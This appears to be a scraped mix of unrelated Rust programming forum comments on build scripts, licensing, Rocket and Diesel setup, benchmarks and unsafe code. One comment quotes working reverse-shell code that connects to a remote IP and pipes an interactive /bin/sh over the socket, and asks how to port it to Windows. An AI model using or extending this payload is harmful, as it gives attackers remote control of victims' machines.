Speaking as someone who tried to actually use the version of quinn using openssl, openssl is a blight on existence that should be purged from the land. This totally unbiased review brought to you by make and pkg-config.
This week I decided to reorganize my emulator into multiple crates and decided to just move it to GitHub with my other public repositories while I was at it because I like the ecosystem there more (I eventually figured GitLab CI out but Travis CI is much more straight forward.) This week I'll probably finish all of the instructions for ARM and Thumb mode and (hopefully) have accurate cycle counting. I do a lot of code generation but I'm still trying to avoid turning my emulator into the macro soup that all of the others written in C or C++ seem to turn into (e.g. [VisualBoyAdvance's LDR/STR handling](https://github.com/visualboyadvance-m/visualboyadvance-m/blob/3eb591cac5acd2bf6b979b6a7c64a88841f8a33e/src/gba/GBA-arm.cpp#L1496) vs [mine](https://github.com/ExPixel/Pyrite/blob/e7301cd7edfe2951632f36215204524984255af5/pyrite-gba/src/cpu/arm/instr_single_data_transfer.rs)).
I'm on mobile, so I don't want to go there. What are you working on exactly?
Also your example code appears to be missing a `fn`.
This covers the case, where existing files are modified. As you sad, new files are not seen as "changed"
`get_config` returns an owned `HashMap`, so you can already mutate that - wrapping it in a `RefCell` does not do anything new. And with the `HashMap` being owned it means that no one else will see if you tried to mutate it - so the setter won't do anything. Maybe you wanted `get_config` to return `&amp;RefCell&lt;HashMap&lt;...&gt;&gt;`? That makes a bit more sense.
That's more of a default choice: I'm a French civil servant, and that's the "official" OSS license of my administration. That being said, it is explicitly compatible with GNU GPL, GNU Affero GPL and EUPL. I will add this to the README so that people know they are not in uncharted territory here. Thanks for your feedback.
Hmm, it doesnt seem to be doing it anymore, just getting one line now using alacritty. Maybe just something weird on my end.
Yeah, not sure why they'd be against the LGPL when they're using MIT already... Anyone care to explain or speculate? 
Well, the problem with cecill A and the GPL for a library crate is that it forces copyleft terms on any application that incorporates that crate. Cecill B or C would generally be viewed as more suitable to the purpose.
You are probably right. I went (hastily) for the most "up-to-date" version, without realizing that it was the most constraining. I'll probably switch to CeCILL-B.
Arrayvec could expose its try_ API.
This tool sounds like a cool thing as a building block for network monitoring. Nice! &gt; Alerts are sent by email. Instead of building email (and possible future methods) into it, I would give it a companion program with a simple IPC interface that does the notification. Then you can swap out the companion program for one that does whatever - send email, send SMS, send IRC messages, flash some alarm light somewhere. E.g. the program opens a named pipe and whenever a server goes down, it simply writes the server's IP to the pipe. Any program can listen and react to an IP being written. The protocol could be slightly more complex too.
If you're looking for other ways to represent the rationals, [quote notation](https://en.wikipedia.org/wiki/Quote_notation) is really cool!
I disagree that it modifies control flow. Sure, internally it does, but *conceptually* it explicitly does not alter control flow, and I believe that’s what matters. Conceptually, await says “wake me up when the value is ready”, whereas yield explicitly modifies control flow, saying “stop running at this point and return to the caller”.
Tls 1.3 was finalized a few months ago, and google’s QUIC specs refer to that as a replacement of the tentative “quic cryto” standard. https://docs.google.com/document/d/1g5nIXAIkN_Y-7XJW5K45IblHd_L2f5LTaDUDwvZ5L6g/mobilebasic
I believe Haskell has this data type and they call it a "ratio" data type. It can be pretty useful.
Very nice. I have a few small improvement suggestions for the docs: `Strong::try_unwrap`: "This works even if there are outstanding frail references." So I think those frail references will probably be invalidated, but an explicit note to that effect would be nice. `Strong::borrow_mut`: I really like that you're referencing the non-panicking version in the panic section. `Strong::into_raw`: What happens to frail references when you do this? Is the control block co-allocated with the actual value so that it can find it again? `Frail::upgrade`: This should reference the non-panicking version in the panic section, like `Strong::borrow_mut` does. `Frail::ptr_eq`: How does this behave for invalidated frail references? Is a frail reference with no more strong references equal to a null reference?
Is this the same thing as block floating point? 
That's the desire but there's issues with it. The discussion is pretty long but here is a nonexhaustive summary of the issues: https://github.com/rust-lang/rfcs/pull/2439#issuecomment-406508601
Does Cargo watch for changes in the targets of `include_bytes!`? If so, could you use that to bring in the input file, and then write the code-generating macro to take a byte array as input? This wouldn't scale to cases where you have input files including or referring to other input files, as you would need to list the transitive closure by hand.
Ah, you’re right, the example perhaps wasn’t so thoroughly thought out but the idea behind it still stands.
It is unfortunate that Tokio is the best Rust has in terms of async programming at the moment. The author of the text piece had the same experience as Eric S. Raymond in http://esr.ibiblio.org/?p=7294. I think this sentence in the piece sums it up: "I have been programming over 20 years, I like to think that I have been around the block a few times. And the simple task of reading a message from TCP using async I/O took me far too long."
https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2018&amp;gist=d71e722651be7adc02b77da1d8704de8
I don't know of an official source. I pronounce them as "mutable reference to x" and "immutable reference to x" though logically I think of those as "unique reference to x" and "shared reference to x".
SOLVED: the following [build.rs](https://build.rs) ( and version 1.2 of build-deps) is watching all files in directory "data/\*" and also new files being added to directory "data/" As adding new files to the directory will change its mod-time, cargo will detect these kind of changes with the following build.rs \`\`\` **extern crate** build\_deps; **fn** main() { *// Enumerate files in sub-folder "data/\*", being relevant for the test-generation (as example)* *// If function returns with error, exit with error message.* build\_deps::rerun\_if\_changed\_paths( **"data/\*"** ).unwrap(); *// Adding the parent directory "data" to the watch-list will capture new-files being added* build\_deps::rerun\_if\_changed\_paths( **"data"** ).unwrap(); } \`\`\`
not really, I often just re-use existing code functions from other projects and adjust as needed.
First of all, please use [rustfmt](https://github.com/rust-lang/rustfmt) Secondly, document your code -- at least write an example code for each pub function Thirdly, utilize modules instead of putting everything into `lib.rs` and wrapping it with `pub mod arithmetic_string {` Lastly, break [this logic (and other places too)](https://gitlab.com/smit_calculators/RGCalculator/blob/master/arithmetic_string_eval/src/lib.rs#L143-175) into smaller functions and avoid **unsafe** codes (I'm not talking `unsafe` keyword but avoid something like `whatever.unwrap()` or `whatever.expect("..")` or `whatever[something]`
Thank you very much :) I will improve my code
Congrats!
Good luck Nick!🙏
I think Haskell [Ratio](http://hackage.haskell.org/package/base-4.12.0.0/docs/Data-Ratio.html) is just plain ol' rationals, actually. These *are* very useful, but can get big.
GFX badly needs an official guide and tutorial. I'm attempting it after having some success with Vulkano; but now Vulkano is trending to abandoned, and no longer compiles for me due to a change in the C build chain. GFX is the new hotness, but is poorly-documented.
I tried to look up the documentation, but [docs.rs is *not* happy](https://docs.rs/crate/floating_bar/0.1.1/builds/138298), although it's not immediately obvious to me why.
Thanks for writing and posting this crate, and for the interesting link to a clear explanation! Our [Nickle](http://nickle.org) programming language has arbitrary-precision rationals as the default representation for fractional numbers. (If you want floating point we've got that too, with default 256 bit mantissa scalable up or down and arbitrary-precision exponent.) Keith Packard implemented a really fast GCD algorithm from the literature, which helps with performance. Nonetheless, this is a really slow and big representation. (We can print and read numbers using a bracketed repeating decimal notation; we haven't seriously considered this as an internal format, though.) The Floating Bar approximation is pretty interesting; I'll be thinking about it. One property the floating point representation has is that numbers nearer to zero are represented more precisely than larger magnitude numbers. This is often cited as a desirable thing. I can't tell from my quick read whether Floating Bar does this too: maybe it does, because of the way the bar is handled.
&gt; Diesel devs have talked several times that the explicit up / down written SQL model is intentional and that its why they don’t have auto migrations. In way simplified terms you would need to have a really gross proc macro / compiler plugin / build script requirement to find all your Diesel marked data structures, generate migrations, and then generate the Diesel schema after that migration is run. Its probably doable, but its not close to a trivial problem and writing your own create / delete / alter statements aren’t that hard to write, especially when aware of the limited subset of SQL types Diesel supports. To build on this, the creator of Diesel (Sean Griffin) is (was?) also the maintainer of Active Record. He talked on The Bikeshed podcast about the challenges and pitfalls of having a DSL or generated migrations, so it definitely seems intentional. He's open to 3rd-party crates adding this functionality for those who want it, however. 
Does this outperform the default std implementation?
Thank you. You make an excellent point. I will take this onboard for a future release. 
PingCAP database looks very nice already. It is great they can hire good profiles like you!
Interesting idea. I will look in to this. &amp;#x200B;
Well Done. PingCap do a great job with TiDB. I have watched a number of talks by people there and have been impressed. 
Wow. If you can speak Korean, I run ~600 members Facebook group for Korean Rust users at https://www.facebook.com/groups/rustlang/ I also run chat-focused Korean Rust user group at https://rust-kr.org/ with an IRC channel and a bridge to Discord. Both the website and Discord bridge are written in Rust!
Thanks for the feedback, I'll make the doc changes. I'm not sure I understand your question about `Strong::into_raw`, just as with `Arc::into_raw` the refcount is left alone and `Frail` references will be able to be upgraded. `Frail::ptr_eq` will consider references returned by `Frail::new` equal, but will never return `true` for two invalidated values coming from two different `Strong`s (again, just like `Weak&lt;T&gt;` in libstd.
😭😭
`uniform_paths` merged [10 days ago](https://github.com/rust-lang/rust/pull/56759#event-2070301624) and was backported to beta. docs.rs used `rustc 1.33.0-nightly (c2d381d39 2019-01-10)` to build, which was built before `uniform_paths` was stable. The crate (deliberately or not) requires rustc ^1.32.0, which sadly excludes the version docs.rs is using currently due to the fun situation caused by beta backports.
So many libraries in rust claim they're fast or efficient without any comparison or usable numbers...
I see parts of this are cargo specific. How much effort would it be to make this work with a non-cargo build system? I realise that's pretty niche, but some companies rely on custom build infra.
What do you mean by a rusty flask? I don't think you're going to see globals and thread_local patterns widely used in Rust as they are used in Python. You also probably won't see an author of an eminent project in one language attempt at it again in another. Armin is ambitious but he's not crazy! Flask drained him in a way that he's had to develop a 3rd degree black belt in self defense to protect himself from consuming his time and attention entirely. Flask is so easy to use. You're likely not going to get that level of experience with Rust without sacrificing *something*. In Rust, you can automate resource registration (as in , registering endpoints and stuff) using proc macros, as Rocket does, but that remains limited to nightly compiler support. This is one reason why actix-web doesn't feature them but instead exposes more boilerplate (the other reason is that you can do more by exposing more).
I'm excited to see what he'll do with Rust.. He's just getting started. 
Interesting. How rustc see this? Can we somehow use this builtin to force macro rerun?
The [README](https://github.com/dtolnay/ryu/blob/master/README.md) links to a paper [Ryū: fast float-to-string conversion](https://dl.acm.org/citation.cfm?id=3192369) that includes performance measurements showing that Ryū beats the best algorithms for binary32 and binary64 floating-point numbers. The Rust crate uses a line-by-line port of the C code for the algorithm (it changes some presentation details, but the algorithm is the same).
This doesn't answer the question, which is practical, not theoretical.
The first benchmark in https://github.com/Alexhuszagh/rust-lexical#benchmarks happens to include a comparison between `ryu` and `core`/`std` (I believe this is `rustcore`). (Also, I agree with you: it's really annoying that so many libraries are apparently "fast", without any actual numbers/comparisons.)
Best wishes!
It's gone now!
So it looks more than 6x faster than rustcore. This would be good.
A couple of gaming videos like League of Legends and Rust.
Looking at the code randomly i noticed that, [here](https://gitlab.com/smit_calculators/RGCalculator/blob/master/arithmetic_string_eval/src/lib.rs#L67-93), you use -1 to indicate "uninitalized" data for `first_lb_index`. It would be more idiomatic and safe to use an `Option&lt;u32&gt;` or `Option&lt;usize&gt;` instead. This would reduce the number of casting. I will look at the code more deeply if i have time. &gt; I didn't watched any tutorial or book Does this mean you haven't read the official rust book? If not, you should totally [read](https://doc.rust-lang.org/book/foreword.html) it.
Nice crates. The `unsafe` seems somewhat dangerous at times: - `expm`'s use of [`static mut`](https://github.com/SuperFluffy/rust-expm/blob/6641f76a88f04ae6196d166534e07e204057271f/src/lib.rs#L120) means that calling a `coefficients` function concurrently (e.g. multiple threads using `expm` on similar matrices) is undefined behaviour - `condest`'s use of `unsafe` for [construction](https://github.com/SuperFluffy/rust-condest/blob/ece5525522f5b0d08f555641e991bee2efdfe295/src/lib.rs#L176-L190) seems risky. A `NonNan::new(0.0)` call probably has the check inlined and removed anyway, so the `unsafe` unnecessary, and, does benchmarking show that the `uninitialized` calls are helpful?
Thanks for the response! &gt; expm's use of static mut means that calling a coefficients function concurrently (e.g. multiple threads using expm on similar matrices) is undefined behaviour Oh, I didn't think of that at all. Several threads would share the same memory location. Ideally, the compiler would use const propagation, because all values necessary for calculating the coefficients are known at compile time, but of course I cannot be sure of that. Technically, these coefficient arrays should be `const`, but there is no way to initialize these currently. Maybe I do just hard code them after all and move the explicit calculation into a test. &gt; condest's use of unsafe for construction seems risky. A NonNan::new(0.0) call probably has the check inlined and removed anyway, so the unsafe unnecessary, and, does benchmarking show that the uninitialized calls are helpful? Yeah, I do the same thing in `expm`. You are probably right and this is a case premature optimization. I will check and fix that.
I cannot help you much on M:N scheduling, but I did write a [CPU affinity crate](https://crates.io/crates/core_affinity) you might like BTW have you tried [work stealing with private deques](https://www.chargueraud.org/research/2013/ppopp/full.pdf)? 
The new implementation uses deques as provided by the crossbeam-deque trait. Each worker has a "Queue" structure which consists out of two "sides": 1. The deque, used by the worker itself to produce new work and by others to steal work 1. A mpsc channel used for pushing work directly onto other workers (crossbeam-deque does not allow this) I ran into the affinity crate before, and I'm considering using it once I figure out how I can best measure the impact of it.
You're right, I omitted an important detail, it didn't just beat the other algorithm, it was three times faster.
Thanks :) I will improve my code as u suggest I landed on book from duckduckgo 90% of the time. &amp;#x200B;
You have to implement trait FromRequest for PgDatabase. impl&lt;'a, 'r&gt; FromRequest&lt;'a, 'r&gt; for PgDatabase { ... This is because Rocket has no way of knowing how to convert Request into PgDatabase. Do not forget to then add PgDatabase to rocket using manage() function.. Example: let pg_database = PgDatabase::something(); rocket::ignite().manage(pg_database) so you can access it in runtime. This is an example of how I did inject Sessioncontext in my application. Example: impl&lt;'a, 'r&gt; FromRequest&lt;'a, 'r&gt; for SessionContext&lt;'r&gt; { type Error = (); fn from_request(request: &amp;'a Request&lt;'r&gt;) -&gt; request::Outcome&lt;SessionContext&lt;'r&gt;, ()&gt; { let mut cookies = request.cookies(); // get global session factory let session_factory: &amp;SessionFactory = request.guard::&lt;State&lt;SessionFactory&gt;&gt;().unwrap().inner(); let session_context = session_factory.get(&amp;mut cookies); Outcome::Success(session_context) } } 
Only a tiny bit depends on Cargo, it was one of design goals to use only language concepts (crates) and no build-system concepts (Cargo's packages) in the core of the analyzer. Supporting arbitrary build system will amount to making [CrateGraph](https://github.com/rust-analyzer/rust-analyzer/blob/b59334e67a3c76c91ccd7bc1212a485ab0ac4065/crates/ra_db/src/input.rs#L40-L54) serializable and adding a UI to use a JSON file with `CrateGraph` instead of inferring it from `cargo metadata`. 
Thank you ! I'll try it now.
The link in case you can't copy-paste the title: https://github.com/agherzan/mandelbrot-viewer
I was about to do that. I wish the title would support links. Thanks. 
Likely of interest: * https://raphlinus.github.io/rust/graphics/2018/10/11/2d-graphics.html * https://raphlinus.github.io/curves/graphics/2019/01/04/followups.html#2d-graphics * https://github.com/linebender/piet It’s still very early days for Piet, though. The text APIs in particular are not settled yet.
I don't know which exact setup you have - e.g. which distribution you run inside your virtual machine. But independently of that, this kind of error message usually means that the C headers for a library - in this case `libarchive` are not installed. They are usually packaged inside a developmend package. On Debian-based distributions, they can be installed by `sudo apt install libarchive-dev`.
Thank you for your response. I get this error when running Pop\_Os!(Ubuntu), Fedora, and OpenSuse. I tried installing libarchive-dev and I still get the same error.
FWIW, Daniel Stenberg (the lead developer of CURL) recently did a blog post on this exact problem https://daniel.haxx.se/blog/2019/01/21/quic-and-missing-apis/ that supports everything you're saying here. I know from personal experience that proprietary vendors especially will sit on one, extremely old, probably unsupported version of OpenSSL for way too long. This is extra painful when your Linux distribution no longer packages an older version so you have to go find and build it yourself because the vendor didn't include a binary.
Maybe you're missing `pkg-config`?
You also need to have `pkg-config` installed, maybe that's what is missing?
Have you read the databases part of the official guide? https://rocket.rs/v0.4/guide/state/#databases It should be pretty straight forward.
Good call! I installed that and now I'm getting error: linking with 'cc' failed: exit code: 1 &amp;#x200B;
I did read it. It's possible i didn't understand everything though, I should have taken more time.
Next iteration: the invocation of the C compiler fails. Do you have either `gcc` or `clang` installed?
Wow! Those are substantial communities. Do you know anyone using rust in production in Korea?
Anyone knows about Rust Meetup in São Paulo?
On a quick glance it looks like you forgot to attach the database struct as a fairing in the ignite chain. From the guide: #[database("sqlite_logs")] struct LogsDbConn(diesel::SqliteConnection); and then .attach(LogsDbConn::fairing()) 
Actually I think I see the issue, I'm useing a Library that links to libalpm. Do you know if there is anyway to to build a program that use a crate if compiling on debian, another one if compiling on arch linux, and so on?
I assume the best way to achieve this is to use different features in your `Cargo.toml`, and build with different feature sets on Debian, Arch etc. Each of the features should require the dependencies you need on the corresponding platform.
That was what i first thought, but... error[E0599]: no function or associated item named `fairing` found for type `PgDatabase` in the current scope --&gt; src/main.rs:98:29 | 42 | struct PgDatabase(diesel::PgConnection); | ---------------------------------------- function or associated item `fairing` not found for this ... 98 | .attach(PgDatabase::fairing()) | ------------^^^^^^^ | | | function or associated item not found in `PgDatabase` Feels like i'm missing some imports or something.
That's a great idea, I had never thought of that. I'm pretty new to this.
Looks like you're also missing `#[macro_use]` clause before the `extern crate rocket_contrib` clause.
I think I've bought both from Bol.com, a Dutch online store. 
A quick google yields just one post: https://users.rust-lang.org/t/rust-at-sao-paulo-bra-lets-spread-the-rust-as-the-future-of-systems-programming/11167
This is very interesting! I am giving this a try, and though I have added the "Sized" constraint to the marker trait I'm getting this error everywhere: \` help: the trait \`core::marker::Sized\` is not implemented for \`Self\`\` &amp;#x200B; any tips? 
Wow, i feel stupid for missing that clause. Thanks a lot! Looks like i only need to learn to manipulate the data, thanks!
All weak references become invalid if you access the value mutably?
What was removed and why? I do not want to miss out a good project.
Please write a Readme.md and out some pictures on the calculator in it. 
It might be useful to edit the solution into the question, and also maybe credit the relevant user(s) if any in the edit. People coming to this in the future might find it easier!
Rustls does not support pinning. While often a token feature in security products one nevertheless needs to have support for it. Using custom certificates with rustls works in theory, but tends to fail in practice. Like it was discussed in the other thread about TLS and tokio. 
Right. Working on it!
No idea, sounds like something graphics-related. I was making a joke considering the parent's comment.
I’m trying to create a simple reverse shell in rust. According to [this stack-overflow page](https://stackoverflow.com/questions/48958814/what-is-the-rust-equivalent-of-a-reverse-shell-script-written-in-python), this is how you would do it on unix. `use std::net::TcpStream; use std::os::unix::io::{AsRawFd, FromRawFd}; use std::process::{Command, Stdio}; fn main() { let s = TcpStream::connect("192.168.1.3:6666").unwrap(); let fd = s. as_raw_fd(); Command::new("/bin/sh") .arg("-i") .stdin(unsafe { Stdio::from_raw_fd(fd) }) .stdout(unsafe { Stdio::from_raw_fd(fd) }) .stderr(unsafe { Stdio::from_raw_fd(fd) }) .spawn() .unwrap() .wait() .unwrap(); }` On windows, there is no as_raw_fd or from_raw_fd. There is as_raw_socket for the TcpStream and from_raw_handle for Stdio. So how would I get a reverse shell working on windows, with the simplest method possible?
&gt; Copyright [yyyy] [name of copyright owner] fix license plz
&gt;Its an useful application worth supporting, but if you have to compile the source code to perform the verification, you might as well use the binary that you compiled yourself instead, so it is not a critical application for end users. There are already 2 independently operated rebuilders for Debian (one by New York University) that publish their certifications of what binaries they got from a source, so users can more easily check there without doing rebuilds on their own. And I do rebuilds for openSUSE and already found several bugs in the software we ship that way. E.g. [https://bugs.launchpad.net/intltool/+bug/1687644](https://bugs.launchpad.net/intltool/+bug/1687644) [https://savannah.gnu.org/support/index.php?109234](https://savannah.gnu.org/support/index.php?109234) [https://github.com/mhulden/foma/pull/78](https://github.com/mhulden/foma/pull/78)
[https://reproducible-builds.org/docs/buy-in/](https://reproducible-builds.org/docs/buy-in/) lists 5+ reasons
The "floating bar" is about allocating bits among the numerator and denominator within a fixed-size bit string. A prefix encodes the width of the denominator, which can be considered the location of the "bar" in the binary representation. This precisely represents all rational numbers with a numerator and denominator that can be represented in few enough total bits. It loses precision when the numerator and denominator would occupy more total bits than are available. This means more precision is available near zero because half of all possible representations allocate more bits to the denominator than to the numerator, i.e. half of all precisely representable values have an absolute value of less than 1, but the distribution of those values may not be the same as floating point.
I'm struggling with some of the rationale you gave. Consider making the error an associated type of the trait. In your example, you have `type Error = ???;`. It seems the simplest way to fill in the `?`s is to use a fresh enum with two variants: one for P1, and one for P2. This has an obvious From implementation for both their error types, allowing you to still use `?`. If either error type is Never, then the variant can't be written down; if both are Never, the whole enum is empty. So you still (should) get the optimization benefits. Does this fail to solve your problem?
&gt; borrowed reference to mutable variable y You've got this one backwards; the reference is mutable. 
I have a main thread which listen to messages from other threads (via `mpsc`), and one of them which sends keystrokes: std::thread::spawn(move || { let stdin = io::stdin(); for evt in stdin.keys() { if let Ok(key) = evt { if sendinput.send(Message::Input(key)).is_err() { break; } trace!("Got key {:?}", key); } } }); Here's the main thread: while let Ok(msg) = receiver.recv() { trace!("Received msg {:?}", msg); match msg { Message::Tick =&gt; { ... } Message::Input(key) =&gt; match key { My problem is that sometimes, say after a few hours running, the input thread doesn't communicate with the main thread anymore. I see the "Got key" traces, but the main thread only receives `Tick` messages, not `Input` messages. Would anyone have an idea what could go wrong, or how to debug this ?
Unfortunately, sometimes "fast" is just part of the name of the algorithm used.
I think I understand where you're coming from, I just take a mental shortcut through it, looking at it from the view of the OS or VM. Any system-level language is going to have to be able to have something like raw pointers, assembly language access, or whatever, because that's what you need to interact with hardware directly and that's what system-level languages are for. So if you want to be able to limit access, you need help from whatever platform is executing the language. You can virtualize the hardware with a virtual machine runtime like .NET or Java, and you can design the VM to have whatever limitations or access control you want (see Webassembly), and it works fine. Or you create assembly that runs on hardware, and you need hardware that has built-in tools for controlling what a program can access. Modern desktop- or phone-grade hardware *has* those tools, and they are controlled by a piece of software, the operating system. So, you can ensure safety for *any* language by making the operating system enforce it. Atop that, you can make the language enforce some sort of safety too, and that's fine, but if you want to enforce safety for every language, it's the OS's job. We know how to do this (see some of the research around the L4 microkernel and such things), the problem is that our OS's are meandering towards strict enforcement from a far more permissive policy by default. Plus writing software that handles sophisticated strict enforcement is hard, and porting software that doesn't expect it to a system that does is even harder.
I wish you the best of luck getting things off the ground! Starting and maintaining a meetup isn't easy, but totally worth it. :) 
Your proposal is exactly the first solution I came up with ;-) But that didn't integrate well with a "unified" error handling, as encouraged by error_chain or similar crates. And as you point out in your edit, it "inflates" the size (and complexity) of error types each time you combine two results...
thread_local! is a alternative to the static mut, it will instantiate one per thread but since it isn't supposed to change. lazy_static! is the global alternative.
Did you have a look at [recv\_timeout()](https://doc.rust-lang.org/std/sync/mpsc/struct.Receiver.html#method.recv_timeout) ? &gt; Attempts to wait for a value on this receiver, returning an error if the corresponding channel has hung up, or if it waits more than timeout. &gt; &gt; This function will always block the current thread if there is no data available and it's possible for more data to be sent. Once a message is sent to the corresponding Sender (or SyncSender), then this receiver will wake up and return that message. &gt; &gt; If the corresponding Sender has disconnected, or it disconnects while this call is blocking, this call will wake up and return Err to indicate that no more messages can ever be received on this channel. However, since channels are buffered, messages sent before the disconnect will still be properly received.
Complete Backtrace \`\`\` thread 'main' panicked at 'called \`Result::unwrap()\` on an \`Err\` value: AccessError { error: ImageNotInitialized { requested: PresentSrc }, command\_name: "vkCmdBindDescriptorSets", command\_param: "Image bound to descriptor 0 of set 0", command\_offset: 1 }', libcore\\result.rs:1009:5 stack backtrace: 0: std::sys::windows::backtrace::set\_frames at /rustc/b6c32da9b0481e3e9d737153286b3ff8aa39a22c\\src/libstd\\sys\\windows\\backtrace\\[mod.rs:104](https://mod.rs:104) 1: std::sys::windows::backtrace::set\_frames at /rustc/b6c32da9b0481e3e9d737153286b3ff8aa39a22c\\src/libstd\\sys\\windows\\backtrace\\[mod.rs:104](https://mod.rs:104) 2: std::sys\_common::backtrace::\_print at /rustc/b6c32da9b0481e3e9d737153286b3ff8aa39a22c\\src/libstd\\sys\_common\\[backtrace.rs:71](https://backtrace.rs:71) 3: std::sys\_common::backtrace::\_print at /rustc/b6c32da9b0481e3e9d737153286b3ff8aa39a22c\\src/libstd\\sys\_common\\[backtrace.rs:71](https://backtrace.rs:71) 4: std::panicking::default\_hook::{{closure}} at /rustc/b6c32da9b0481e3e9d737153286b3ff8aa39a22c\\src/libstd\\[panicking.rs:211](https://panicking.rs:211) 5: std::panicking::default\_hook at /rustc/b6c32da9b0481e3e9d737153286b3ff8aa39a22c\\src/libstd\\[panicking.rs:227](https://panicking.rs:227) 6: std::panicking::rust\_panic\_with\_hook at /rustc/b6c32da9b0481e3e9d737153286b3ff8aa39a22c\\src/libstd\\[panicking.rs:476](https://panicking.rs:476) 7: std::panicking::continue\_panic\_fmt at /rustc/b6c32da9b0481e3e9d737153286b3ff8aa39a22c\\src/libstd\\[panicking.rs:390](https://panicking.rs:390) 8: std::panicking::rust\_begin\_panic at /rustc/b6c32da9b0481e3e9d737153286b3ff8aa39a22c\\src/libstd\\[panicking.rs:325](https://panicking.rs:325) 9: core::panicking::panic\_fmt at /rustc/b6c32da9b0481e3e9d737153286b3ff8aa39a22c\\src/libcore\\[panicking.rs:77](https://panicking.rs:77) 10: core::result::unwrap\_failed&lt;vulkano::command\_buffer::traits::CommandBufferExecError&gt; at \\libcore\\[macros.rs:26](https://macros.rs:26) 11: core::result::Result&lt;vulkano::command\_buffer::traits::CommandBufferExecFuture&lt;vulkano::sync::future::join::JoinFuture&lt;alloc::boxed::Box&lt;GpuFuture&gt;, vulkano::swapchain::swapchain::SwapchainAcquireFuture&lt;winit::Window&gt;&gt;, vulkano::command\_buffer::auto::AutoCommandBuffer&lt;vulkano::command\_buffer::pool::standard::StandardCommandPoolAlloc&gt;&gt;, vulkano::command\_buffer::traits::CommandBufferExecError&gt;::unwrap&lt;vulkano::command\_buffer::traits::CommandBufferExecFuture&lt;vulkano::sync::future::join::JoinFuture&lt;alloc::boxed::Box&lt;GpuFuture&gt;, vulkano::swapchain::swapchain::SwapchainAcquireFuture&lt;winit::Window&gt;&gt;, vulkano::command\_buffer::auto::AutoCommandBuffer&lt;vulkano::command\_buffer::pool::standard::StandardCommandPoolAlloc&gt;&gt;,vulkano::command\_buffer::traits::CommandBufferExecError&gt; at \\libcore\\[result.rs:808](https://result.rs:808) 12: vulkan\_test::main at .\\src\\[main.rs:178](https://main.rs:178) 13: std::rt::lang\_start::{{closure}}&lt;()&gt; at \\libstd\\[rt.rs:74](https://rt.rs:74) 14: std::rt::lang\_start\_internal::{{closure}} at /rustc/b6c32da9b0481e3e9d737153286b3ff8aa39a22c\\src/libstd\\[rt.rs:59](https://rt.rs:59) 15: std::rt::lang\_start\_internal::{{closure}} at /rustc/b6c32da9b0481e3e9d737153286b3ff8aa39a22c\\src/libstd\\[rt.rs:59](https://rt.rs:59) 16: panic\_unwind::\_\_rust\_maybe\_catch\_panic at /rustc/b6c32da9b0481e3e9d737153286b3ff8aa39a22c\\src/libpanic\_unwind\\[lib.rs:102](https://lib.rs:102) 17: std::panicking::try at /rustc/b6c32da9b0481e3e9d737153286b3ff8aa39a22c\\src/libstd\\[panicking.rs:289](https://panicking.rs:289) 18: std::panicking::try at /rustc/b6c32da9b0481e3e9d737153286b3ff8aa39a22c\\src/libstd\\[panicking.rs:289](https://panicking.rs:289) 19: std::panicking::try at /rustc/b6c32da9b0481e3e9d737153286b3ff8aa39a22c\\src/libstd\\[panicking.rs:289](https://panicking.rs:289) 20: std::rt::lang\_start&lt;()&gt; at \\libstd\\[rt.rs:74](https://rt.rs:74) 21: main 22: invoke\_main at d:\\agent\\\_work\\1\\s\\src\\vctools\\crt\\vcstartup\\src\\startup\\exe\_common.inl:78 23: invoke\_main at d:\\agent\\\_work\\1\\s\\src\\vctools\\crt\\vcstartup\\src\\startup\\exe\_common.inl:78 24: BaseThreadInitThunk 25: RtlUserThreadStart \`\`\`
What is the purpose of [this](https://gitlab.com/smit_calculators/RGCalculator/blob/master/calculator/3) file?
It creates a window for calculator
I have the following code: pub(crate) fn parse&lt;'a&gt;(input: &amp;'a str, name: &amp;'a str) -&gt; Result&lt;Chunk&lt;'a&gt;, ParsingError&lt;'a&gt;&gt; { let pos = Position::new(input, name); let (chunk, _) = parse_chunk(&amp;pos, b'\0')?; Ok(chunk) } fn parse_chunk&lt;'a&gt;( pos: &amp;'a Position, terminator: u8, ) -&gt; Result&lt;(Chunk&lt;'a&gt;, Position&lt;'a&gt;), ParsingError&lt;'a&gt;&gt; { unimplemented!() } When I try to compile it, I get the following error: error[E0515]: cannot return value referencing local variable `pos` --&gt; src\xxx.rs:10:5 | 9 | let (chunk, _) = parse_chunk(&amp;pos, b'\0')?; | ---- `pos` is borrowed here 10 | Ok(chunk) | ^^^^^^^^^ returns a value referencing data owned by the current function But neither `Chunk` nor `ParsingError` contain a reference to `pos`, they only contain references to inner slices of `input`. Is it because `pos` has borrowed that `input` reference? I theoretically should be able to change the lifetime of `name` to `&amp;_`, since I don't return a reference to it, but that's what I get: | 7 | pub(crate) fn parse&lt;'a&gt;(input: &amp;'a str, name: &amp;'_ str) -&gt; Result&lt;Chunk&lt;'a&gt;, ParsingError&lt;'a&gt;&gt; { | ------- help: add explicit lifetime `'a` to the type of `name`: `&amp;'a str` ... 10 | Ok(chunk) | ^^^^^^^^^ lifetime `'a` required I am completely baffled right now.
No. Its misplaced copy of src/main.rs
Any good reason it's out of the `src` directory?
In that case, you probably want to post this in /r/playrust. This subreddit is about the Rust programming language.
&gt;src I deleted it now. It was misplaced 
The post doesn't give too much detail, here are my comments on it. Jon Harrop is a big fan of functional, GC'ed languages, and from time to time shows benchmarks that show C++ being much slower than the other languages, usually because they're bottlenecked on memory allocation and/or reference counting. In this case, the code spends some 30% of the time allocating and freeing memory, and 20% in `Expr::count`. Setting `codegen-units = 1` and enabling LTO makes the test case 23% faster (`codegen-units` is a snag many people doing benchmarks like this run into). I don't care enough for his benchmarks to spend time optimizing them, but maybe somebody else wants to play with it.
Umm, that wasn't me. The poster above deleted their comment a while ago.
Nice. In case you are interested in a rust implementation utilizing glsl for the core algorithm: [https://github.com/pacman82/mandelbrot](https://github.com/pacman82/mandelbrot)
Hmmmm I wonder why
